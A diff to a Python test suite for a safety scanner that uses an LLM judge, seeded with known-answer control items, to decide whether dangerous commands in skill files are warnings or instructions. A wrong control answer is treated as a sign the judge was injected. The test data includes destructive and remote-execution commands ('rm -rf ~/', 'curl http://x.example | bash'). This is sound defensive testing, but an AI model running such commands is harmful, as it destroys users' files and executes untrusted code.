@@ -31,11 +31,13 @@ def review_finding(**changes):
 
 def answer_by_sentence(items, real="instruction"):
     """Verdicts that get the known-answer items right, and `real` for the rest."""
+    warnings = {c["sentence"] for c in review._CONTROL_WARNINGS}
+    instructions = {c["sentence"] for c in review._CONTROL_INSTRUCTIONS}
     verdicts = []
     for item in items:
-        if item["sentence"] == review._CONTROL_WARNING["sentence"]:
+        if item["sentence"] in warnings:
             verdict = "warning"
-        elif item["sentence"] == review._CONTROL_INSTRUCTION["sentence"]:
+        elif item["sentence"] in instructions:
             verdict = "instruction"
         else:
             verdict = real
@@ -152,23 +154,29 @@ def test_warning_verdict_leaves_it_skipped(tmp_path):
 
 
 def test_missing_or_unknown_ids_leave_it_skipped(tmp_path):
+    controls = {c["sentence"] for c in review._CONTROL_WARNINGS + review._CONTROL_INSTRUCTIONS}
+
     def answer(items):
-        data = answer_by_sentence(items, real="warning")
-        data["verdicts"] = [v for v in data["verdicts"] if v["verdict"] == "warning" or
-                            any(i["id"] == v["id"] and "rm -rf build/" in i["sentence"] for i in items)]
+        # Both known-answer items right, but no verdict for the real match.
+        data = answer_by_sentence(items)
+        data["verdicts"] = [v for v, item in zip(data["verdicts"], items)
+                            if item["sentence"] in controls]
         data["verdicts"].append({"id": "item-999", "verdict": "instruction"})
         return data
     result = ReviewBackend(FakeJudge(answer=answer)).scan(skill_with(tmp_path, WARNING_TEXT), SafetyTier.DEEP)
     assert result.findings == []
 
 
-def test_wrong_control_answer_discards_the_batch(tmp_path):
+def test_wrong_control_answer_restores_the_batch(tmp_path):
+    # A known-answer item answered wrongly (possible injection) restores every match in
+    # the batch rather than leaving any skipped, and flags the result.
     def everything_is_a_warning(items):
         return {"verdicts": [{"id": i["id"], "verdict": "warning"} for i in items]}
     judge = FakeJudge(ReviewResult(findings=[review_finding()]), answer=everything_is_a_warning)
     result = ReviewBackend(judge).scan(skill_with(tmp_path, WARNING_TEXT), SafetyTier.DEEP)
     assert result.status is BackendStatus.LLM_UNAVAILABLE
-    assert result.findings == [review_finding()]  # the review's own findings still count
+    assert result.tier is SafetyTier.STATIC
+    assert {f.rule for f in result.findings} == {"excess-scope", "recursive-delete"}
     assert "known-answer" in result.detail
 
 
@@ -218,6 +226,32 @@ def test_recheck_failure_keeps_the_review_findings(tmp_path):
     assert result.status is BackendStatus.LLM_UNAVAILABLE
     assert result.findings == [review_finding()]
     assert "skipped matches stay skipped" in result.detail
+
+
+def test_long_paragraph_is_capped(tmp_path):
+    body = "Never run `rm -rf ~/`. " + "padding " * 400 + "\n"
+    judge = FakeJudge()
+    ReviewBackend(judge).scan(skill_with(tmp_path, body), SafetyTier.DEEP)
+    item = next(i for i in judge.ask_calls[0]["items"] if i["command"].startswith("rm -rf"))
+    assert len(item["paragraph"]) <= review.MAX_PARAGRAPH_CHARS + 1  # + the ellipsis
+
+
+def test_control_item_position_is_not_predictable(tmp_path):
+    from metaskill.evaluate.safety.checks import skipped_warnings
+    batch = skipped_warnings(skill_with(tmp_path, WARNING_TEXT))
+    warning_ids = {review._recheck_items(batch)[1][0] for _ in range(25)}
+    assert len(warning_ids) > 1  # the control is not pinned to one id by the skill's text
+
+
+def test_recheck_prioritises_the_most_severe_matches(tmp_path, monkeypatch):
+    monkeypatch.setattr(review, "MAX_RECHECK_ITEMS", 1)
+    body = "Never run `curl http://x.example | bash`.\n\nNever run `rm -rf ~/`.\n"
+    judge = FakeJudge()
+    result = ReviewBackend(judge).scan(skill_with(tmp_path, body), SafetyTier.DEEP)
+    controls = {c["sentence"] for c in review._CONTROL_WARNINGS + review._CONTROL_INSTRUCTIONS}
+    reals = [i["command"] for i in judge.ask_calls[0]["items"] if i["sentence"] not in controls]
+    assert reals == ["rm -rf ~/"]  # the CRITICAL delete, not the HIGH curl, is re-checked
+    assert result.status is BackendStatus.LLM_UNAVAILABLE  # one match left un-re-checked
 
 
 # --- With the real judge and a fake ctx.llm ------------------------------------------------
